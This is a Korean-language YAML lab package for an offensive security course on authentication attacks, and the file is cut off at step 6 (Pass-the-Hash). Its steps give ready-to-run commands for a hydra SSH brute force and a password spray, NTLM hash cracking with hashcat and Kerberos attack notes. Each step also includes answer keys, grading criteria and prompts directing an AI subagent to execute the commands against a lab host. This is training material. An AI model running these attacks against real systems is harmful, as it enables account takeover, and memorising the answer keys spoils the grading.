lab_id: attack-adv-ai-week05
title: 인증 공격 (Kerberos/NTLM) (AI 지원)
version: ai
course: attack-adv-ai
week: 5
description: Kerberos, NTLM 등 엔터프라이즈 인증 프로토콜의 취약점을 분석하고 공격한다. 비밀번호 스프레이, Pass-the-Hash,
  AS-REP Roasting 등 Active Directory 환경의 인증 공격을 실습한다. AI SubAgent가 자동으로 명령을 실행하고 결과를
  검증합니다.
difficulty: hard
duration_minutes: 120
objectives:
- Kerberos 인증 프로토콜의 동작 원리와 약점을 이해한다
- 비밀번호 스프레이, 브루트포스 등 인증 공격을 수행한다
- 해시 기반 인증 공격(Pass-the-Hash, Kerberoasting)을 실습한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: SSH 서비스({{WEB_IP}}:22)에 대해 hydra를 사용하여 비밀번호 브루트포스를 시도하라. 사용자 root,
    비밀번호 목록은 /usr/share/wordlists/rockyou.txt의 상위 10개를 사용하라.
  hint: hydra -l 사용자 -P 비밀번호파일 ssh://대상 형태이다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: SSH 서비스(10.20.30.80:22)에 대해 hydra를 사용하여 비밀번호 브루트포스를 시도해줘

    📎 참고 (CLI): head -10 /usr/share/wordlists/rockyou.txt > /tmp/top10pass.txt 2>/dev/null
    || echo -e ''password\n123456\n12345678\nqwerty\nabc123\nmonkey\n1234567\nletmein\ntrustno1\ndragon''
    > /tmp/top10pass.txt && hydra -l root -P /tmp/top10pass.txt ssh://10.20.30.80
    -t 4 -V 2>&1 | tail -15'
  answer_detail: 비밀번호 브루트포스는 가장 기본적인 인증 공격이다. hydra는 SSH, FTP, HTTP, SMB 등 50개 이상의
    프로토콜을 지원하는 온라인 브루트포스 도구이다. -t 옵션으로 동시 스레드 수를 제한하여 계정 잠금을 회피한다. 방어를 위해 fail2ban,
    계정 잠금 정책, MFA를 적용한다.
  verify:
    type: output_contains
    expect: hydra
    field: stdout
    semantic:
      intent: SSH 서비스에 대한 hydra 비밀번호 브루트포스 공격 시연 — root 계정에 상위 10개 비밀번호 목록으로 시도
      success_criteria:
      - hydra -l root -P <wordlist> ssh://<target> 형태 명령 실행
      - 비밀번호 목록(rockyou 상위 또는 대체 10개) 준비 과정 포함
      - hydra 실행 결과(login 시도 로그 또는 successful/failed 상태) 출력·해석
      acceptable_methods:
      - hydra -l -P ssh:// 로 직접 실행
      - medusa -u root -P <wordlist> -M ssh 로 동등 공격
      - ncrack --user root -P <wordlist> ssh://<target>
      - python paramiko 반복 로그인 시도 스크립트
      negative_signs:
      - hydra 설치 실패만 출력되고 대체 시도 없음
      - 단일 비밀번호만 시도 (목록 없음)
      - root 이외 임의 계정만 시도 (지시 이탈)
  target_vm: attacker
  script: head -10 /usr/share/wordlists/rockyou.txt > /tmp/top10pass.txt 2>/dev/null
    || echo -e 'password\n123456\n12345678\nqwerty\nabc123\nmonkey\n1234567\nletmein\ntrustno1\ndragon'
    > /tmp/top10pass.txt && hydra -l root -P /tmp/top10pass.txt ssh://10.20.30.80
    -t 4 -V 2>&1 | tail -15
  risk_level: medium
  bastion_prompt: 'SSH 서비스(10.20.30.80:22)에 대해 hydra를 사용하여 비밀번호 브루트포스를 시도해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 2
  instruction: 비밀번호 스프레이 공격을 시뮬레이션하라. 여러 사용자명에 대해 동일한 비밀번호를 시도하는 스크립트를 작성하라.
  hint: 사용자명 목록을 만들고 hydra의 -L(사용자목록) -p(단일비밀번호) 옵션을 사용한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 비밀번호 스프레이 공격을 시뮬레이션하라 구현 방법과 예시를 설명해줘

    📎 참고 (CLI): echo -e ''admin\nroot\nuser\ntest\noperator'' > /tmp/users.txt &&
    hydra -L /tmp/users.txt -p ''Password123!'' ssh://10.20.30.80 -t 2 -V 2>&1 | tail
    -15'
  answer_detail: '비밀번호 스프레이는 브루트포스와 달리 하나의 비밀번호를 여러 계정에 시도한다. 계정 잠금 정책(예: 5회 실패 시
    잠금)을 우회하면서 약한 비밀번호를 가진 계정을 찾는다. 조직에서 흔한 비밀번호 패턴(Company2026!, Season+Year 등)을
    사용한다.'
  verify:
    type: output_contains
    expect: login
    field: stdout
    semantic:
      intent: 비밀번호 스프레이 공격 시뮬레이션 — 하나의 공통 비밀번호를 여러 사용자명에 시도해 계정 잠금 우회
      success_criteria:
      - 사용자명 목록(admin, root, user 등) 파일 생성 또는 배열 정의
      - hydra -L <users> -p <password> ssh://<target> 형태 단일 비밀번호 다중 사용자 공격 실행
      - 브루트포스 vs 스프레이의 차이(계정 잠금 정책 우회) 설명
      acceptable_methods:
      - hydra -L <users> -p <pw> ssh://<target> -t 2
      - medusa -U <users> -p <pw> -M ssh
      - crackmapexec smb/winrm/ldap 로 AD 환경 스프레이
      - python 반복 루프로 사용자 순회
      negative_signs:
      - 단일 사용자만 시도 (스프레이 아님)
      - 비밀번호 목록만 시도하고 사용자 고정 (브루트포스)
      - 계정 잠금 정책 언급 없이 단순 브루트포스 반복
  target_vm: attacker
  script: echo -e 'admin\nroot\nuser\ntest\noperator' > /tmp/users.txt && hydra -L
    /tmp/users.txt -p 'Password123!' ssh://10.20.30.80 -t 2 -V 2>&1 | tail -15
  risk_level: medium
  bastion_prompt: '비밀번호 스프레이 공격을 시뮬레이션하라. 여러 사용자명에 대해 동일한 비밀번호를 시도하는 스크립트를 작성하라.


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 3
  instruction: SSH 서비스의 인증 방식을 확인하라. nmap의 ssh-auth-methods 스크립트로 {{WEB_IP}}에서 허용되는
    인증 방식을 나열하라.
  hint: nmap --script ssh-auth-methods -p 22 대상 형태로 실행한다
  category: recon
  points: 10
  answer: '🤖 프롬프트: SSH가 지원하는 인증 방식(publickey, password, keyboard-interactive)의 차이와
    nmap ssh-auth-methods 스크립트로 허용 방식을 확인하는 방법을 설명해줘

    📎 참고 (CLI): nmap --script ssh-auth-methods -p 22 10.20.30.80'
  answer_detail: SSH 인증 방식에는 password, publickey, keyboard-interactive, gssapi-with-mic(Kerberos)
    등이 있다. password 인증이 활성화되어 있으면 브루트포스 대상이 되고, gssapi가 활성화되어 있으면 Kerberos 기반 공격이
    가능하다. 보안 강화를 위해 publickey만 허용하는 것이 권장된다.
  verify:
    type: output_contains
    expect: ssh-auth-methods
    field: stdout
    semantic:
      intent: nmap ssh-auth-methods NSE 스크립트로 타겟 SSH 서버가 허용하는 인증 방식 열거
      success_criteria:
      - nmap --script ssh-auth-methods -p 22 <target> 실행 또는 예시 명령 제시
      - publickey/password/keyboard-interactive 등 SSH 인증 방식 구분 설명
      - 허용 방식별 공격 경로(password→브루트포스, gssapi→Kerberos) 언급
      acceptable_methods:
      - nmap --script ssh-auth-methods 직접 실행
      - ssh -v -o PreferredAuthentications=none <target> 로 지원 방식 획득
      - ssh2-enum-algos 스크립트 병행
      - 수동 ssh -vvv 로 handshake 로그 해석
      negative_signs:
      - 포트 22 접근만 확인하고 인증 방식 열거 없음
      - ssh-auth-methods 스크립트를 사용했지만 결과 해석 없음
      - 다른 nmap 스크립트(http-title 등) 무관한 결과만
  target_vm: attacker
  script: nmap --script ssh-auth-methods -p 22 10.20.30.80
  risk_level: low
  bastion_prompt: 'SSH가 지원하는 인증 방식(publickey, password, keyboard-interactive)의 차이와
    nmap ssh-auth-methods 스크립트로 허용 방식을 확인하는 방법을 설명해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 4
  instruction: Kerberos 프로토콜의 동작 원리를 분석하라. 각 메시지 교환(AS-REQ/AS-REP, TGS-REQ/TGS-REP,
    AP-REQ/AP-REP)을 다이어그램으로 /tmp/kerberos_flow.txt에 작성하라.
  hint: Kerberos의 3단계 인증 흐름을 텍스트 다이어그램으로 작성한다
  category: analysis
  points: 10
  answer: '🤖 프롬프트: Kerberos 프로토콜의 동작 원리를 분석하라 구현 방법과 예시를 설명해줘

    📎 참고 (CLI): cat > /tmp/kerberos_flow.txt << ''EOF''

    === Kerberos Authentication Flow ===


    [Phase 1: Authentication Service]

    Client --AS-REQ(username)--> KDC

    KDC --AS-REP(TGT encrypted with krbtgt hash)--> Client

    * Vulnerability: AS-REP Roasting (no pre-auth)


    [Phase 2: Ticket Granting Service]

    Client --TGS-REQ(TGT + SPN)--> KDC

    KDC --TGS-REP(Service Ticket encrypted with service hash)--> Client

    * Vulnerability: Kerberoasting (crack service ticket offline)


    [Phase 3: Application Service]

    Client --AP-REQ(Service Ticket)--> Service

    Service --AP-REP(optional mutual auth)--> Client

    * Vulnerability: Silver Ticket (forged service ticket)


    [Additional Attacks]

    - Golden Ticket: Forged TGT using krbtgt hash

    - Pass-the-Ticket: Reuse stolen tickets

    - Overpass-the-Hash: NTLM hash -> Kerberos ticket

    EOF

    cat /tmp/kerberos_flow.txt'
  answer_detail: Kerberos는 대칭키 암호화 기반의 3단계 인증 프로토콜이다. 각 단계에서 고유한 취약점이 존재한다. AS-REP
    Roasting은 사전 인증이 비활성화된 계정을 대상으로, Kerberoasting은 서비스 티켓의 오프라인 크래킹을, Golden/Silver
    Ticket은 키 노출 시 티켓 위조를 가능하게 한다.
  verify:
    type: output_contains
    expect: Kerberos Authentication Flow
    field: stdout
    semantic:
      intent: Kerberos 프로토콜의 3단계 인증 흐름(AS-REQ/REP, TGS-REQ/REP, AP-REQ/REP) 및 각 단계의
        공격 벡터를 /tmp/kerberos_flow.txt 파일로 작성
      success_criteria:
      - Phase 1 (AS), Phase 2 (TGS), Phase 3 (AP) 각 단계별 메시지 교환 다이어그램 포함
      - AS-REP Roasting, Kerberoasting, Silver/Golden Ticket 등 각 단계 관련 공격 언급
      - 파일 생성(cat > /tmp/kerberos_flow.txt) 및 cat 으로 검증 출력
      acceptable_methods:
      - heredoc 으로 다줄 텍스트 파일 작성
      - echo -e 로 개행 포함 문자열 저장
      - python 으로 파일 write
      - markdown/ascii art 형식으로 다이어그램 구성
      negative_signs:
      - 3단계 중 1-2단계만 다룸
      - 파일 생성 없이 화면 출력만
      - 공격 벡터 언급 없이 흐름만 나열
  target_vm: attacker
  script: 'cat > /tmp/kerberos_flow.txt << ''EOF''

    === Kerberos Authentication Flow ===


    [Phase 1: Authentication Service]

    Client --AS-REQ(username)--> KDC

    KDC --AS-REP(TGT encrypted with krbtgt hash)--> Client

    * Vulnerability: AS-REP Roasting (no pre-auth)


    [Phase 2: Ticket Granting Service]

    Client --TGS-REQ(TGT + SPN)--> KDC

    KDC --TGS-REP(Service Ticket encrypted with service hash)--> Client

    * Vulnerability: Kerberoasting (crack service ticket offline)


    [Phase 3: Application Service]

    Client --AP-REQ(Service Ticket)--> Service

    Service --AP-REP(optional mutual auth)--> Client

    * Vulnerability: Silver Ticket (forged service ticket)


    [Additional Attacks]

    - Golden Ticket: Forged TGT using krbtgt hash

    - Pass-the-Ticket: Reuse stolen tickets

    - Overpass-the-Hash: NTLM hash -> Kerberos ticket

    EOF

    cat /tmp/kerberos_flow.txt'
  risk_level: low
  bastion_prompt: Kerberos 프로토콜의 동작 원리를 분석하라. 각 메시지 교환(AS-REQ/AS-REP, TGS-REQ/TGS-REP,
    AP-REQ/AP-REP)을 다이어그램으로 /tmp/kerberos_flow.txt에 작성하라.
- order: 5
  instruction: hashcat을 사용하여 NTLM 해시를 크래킹하라. 샘플 해시를 생성하고 rockyou 워드리스트(시뮬레이션)로 크래킹을
    시도하라.
  hint: python3으로 NTLM 해시를 생성하고, hashcat -m 1000으로 크래킹한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: hashcat을 사용하여 NTLM 해시를 크래킹해줘

    📎 참고 (CLI): HASH=$(python3 -c "import hashlib; print(hashlib.new(''md4'', ''password''.encode(''utf-16-le'')).hexdigest())")
    && echo "NTLM Hash: $HASH" && echo $HASH > /tmp/ntlm.hash && echo ''password''
    > /tmp/mini_wordlist.txt && hashcat -m 1000 /tmp/ntlm.hash /tmp/mini_wordlist.txt
    --force 2>&1 | tail -10 || echo "Hash: $HASH (hashcat requires GPU, showing hash
    generation)"'
  answer_detail: NTLM 해시는 MD4(UTF-16LE(password))로 계산되며 솔트가 없다. 따라서 레인보우 테이블 공격에 취약하고,
    hashcat이나 john으로 빠르게 크래킹된다. hashcat -m 1000은 NTLM 모드이며, GPU를 사용하면 초당 수십억 개의 후보를
    시도할 수 있다.
  verify:
    type: output_contains
    expect: NTLM Hash
    field: stdout
    semantic:
      intent: hashcat 으로 NTLM 해시 크래킹 — 샘플 NTLM 해시 생성 후 소형 워드리스트로 복호화 시연
      success_criteria:
      - python3 hashlib.new('md4', pw.encode('utf-16-le')) 로 NTLM 해시 생성 또는 동등 방법
      - hashcat -m 1000 (NTLM 모드) 사용 명령 제시
      - 워드리스트와 해시 파일 준비 후 hashcat 실행 결과(크랙 성공/GPU 요구) 해석
      acceptable_methods:
      - hashcat -m 1000 <hashfile> <wordlist> --force
      - john --format=nt <hashfile> --wordlist=<wordlist>
      - python impacket.ntlm 로 해시 생성 후 도구 전달
      - GPU 불가 시 해시 생성·모드 번호 설명만으로도 대체 가능
      negative_signs:
      - NTLM 이 아닌 다른 해시(MD5/SHA1) 만 다룸
      - 해시 생성 없이 hashcat 명령만 나열
      - 크랙 결과 해석 없이 단순 설치 오류 출력
  target_vm: attacker
  script: 'HASH=$(python3 -c "import hashlib; print(hashlib.new(''md4'', ''password''.encode(''utf-16-le'')).hexdigest())")
    && echo "NTLM Hash: $HASH" && echo $HASH > /tmp/ntlm.hash && echo ''password''
    > /tmp/mini_wordlist.txt && hashcat -m 1000 /tmp/ntlm.hash /tmp/mini_wordlist.txt
    --force 2>&1 | tail -10 || echo "Hash: $HASH (hashcat requires GPU, showing hash
    generation)"'
  risk_level: medium
  bastion_prompt: 'hashcat을 사용하여 NTLM 해시를 크래킹해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 6
  instruction: Pass-the-Hash 공격의 원리를 설명하고, 실습 환경에서 해시 기반 인증을 시뮬레이션하라. curl로 HTTP Basic
    Auth에 해시를 사용하는 과정을 보여라.
  hint: NTLM 인증에서는 비밀번호 대신 해시를 직접 사용할 수 있다
  category: exploit
  points: 10
